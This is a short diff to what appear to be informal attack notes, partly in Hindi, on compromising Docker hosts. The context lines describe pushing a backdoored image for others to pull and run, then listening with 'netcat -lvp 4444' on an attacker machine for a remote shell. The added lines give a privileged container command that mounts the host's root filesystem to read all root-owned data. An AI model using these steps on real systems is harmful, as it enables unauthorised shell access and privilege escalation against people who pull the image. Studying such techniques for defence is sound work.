@@ -5,4 +5,6 @@
       - make one commit and let any one pull and run this then on attacker machine run: netcat -lvp 4444
       - jb he koi se container start karega you will get aacess.
 
-2) 
+2) privileged escalation attack via volume mounts:
+    docker run -dit --name karma --privileged -v /:/mnt ubuntu
+        - you can see the all the data root user.
